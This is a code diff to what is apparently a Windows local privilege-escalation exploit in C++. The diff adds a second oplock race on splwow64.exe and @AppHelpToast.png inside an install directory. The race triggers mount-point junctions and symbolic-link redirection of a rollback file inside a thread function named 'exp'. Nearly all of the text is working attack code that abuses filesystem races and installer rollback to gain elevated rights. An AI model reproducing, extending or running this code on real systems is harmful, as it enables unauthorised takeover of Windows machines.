@@ -26,8 +26,12 @@ WCHAR global_msft_plz[MAX_PATH];
 HANDLE global_sm_link = NULL;
 HANDLE hglobal_msft_plz = NULL;
 HANDLE global_new_msft_plz = NULL;
+HANDLE hspl = NULL;
+HANDLE htoast = NULL;
+bool OplockTrigger = false;
 WCHAR global_temp[MAX_PATH];
 WCHAR EdgeSvcPath[MAX_PATH];
+
 
 WCHAR* _GetUserSid() {
 
@@ -181,9 +185,23 @@ std::wstring _BuildNativePath(std::wstring path) {
     path = L"\\??\\" + path;
     return path;
 }
-void cb() {
-
-    global_fnr_handle = op.OpenFileNative(global_rbf_full_path, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, OPEN_ALWAYS);
+void cb_spl() {
+    if (OplockTrigger)
+        return;
+    OplockTrigger = true;
+    CloseHandle(htoast);
+    WCHAR ss[MAX_PATH];
+    wcscpy_s(ss, GlobalInstallDir);
+    StringCchCat(ss, MAX_PATH, L"\\");
+    StringCchCat(ss, MAX_PATH, op.GenerateRandomStr().c_str());
+    global_new_msft_plz = op.OpenDirectory(ss, GENERIC_READ | GENERIC_WRITE | DELETE, ALL_SHARING, OPEN_ALWAYS);
+    op.CreateMountPoint(global_new_msft_plz, L"\\BaseNamedObjects\\Restricted");
+}
+void cb_toast() {
+    if (OplockTrigger)
+        return;
+    OplockTrigger = true;
+    CloseHandle(hspl);
     WCHAR ss[MAX_PATH];
     wcscpy_s(ss, GlobalInstallDir);
     StringCchCat(ss, MAX_PATH, L"\\");
@@ -246,6 +264,7 @@ void cb2() {
 
     global_sm_link = CreateSMForRbf(sm);
 }
+
 DWORD WINAPI exp(void*) {
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
     wcscpy_s(global_msft_plz, GlobalInstallDir);
@@ -266,11 +285,21 @@ DWORD WINAPI exp(void*) {
     } while (!test);
     CloseHandle(test);
     WCHAR spl[MAX_PATH];
+    WCHAR toast[MAX_PATH];
+    wcscpy_s(toast, GlobalInstallDir);
     wcscpy_s(spl, GlobalInstallDir);
+    StringCchCat(toast, MAX_PATH, L"\\@AppHelpToast.png");
     StringCchCat(spl, MAX_PATH, L"\\splwow64.exe");
-    HANDLE hspl = op.OpenFileNative(spl, GENERIC_READ | GENERIC_WRITE, NULL, OPEN_ALWAYS);
+
+    hspl = op.OpenFileNative(spl, GENERIC_READ | GENERIC_WRITE, NULL, OPEN_ALWAYS);
+    htoast = op.OpenFileNative(toast, GENERIC_READ | GENERIC_WRITE, NULL, OPEN_ALWAYS);
     hglobal_msft_plz = op.OpenDirectory(global_msft_plz, DELETE, ALL_SHARING, OPEN_EXISTING);
-    op.CreateAndWaitLock(hspl, cb);
+    lock_ptr lk_spl = op.CreateLock(hspl, cb_spl);
+    lock_ptr lk_toast = op.CreateLock(htoast, cb_toast);
+    while (!OplockTrigger) {  }// a pure waste of your precious cpu
+    delete lk_spl;
+    delete lk_toast;
+    global_fnr_handle = op.OpenFileNative(global_rbf_full_path, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, OPEN_ALWAYS);
     op.CreateAndWaitLock(global_fnr_handle, cb2);
     return ERROR_SUCCESS;
 }
@@ -375,6 +404,7 @@ int wmain(int argc, wchar_t *argv[])
         LaunchBroker();
         return 0;
     }
+
     SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS);
     ChangeProcessACL();
     PrepareGlobalInstallDir();
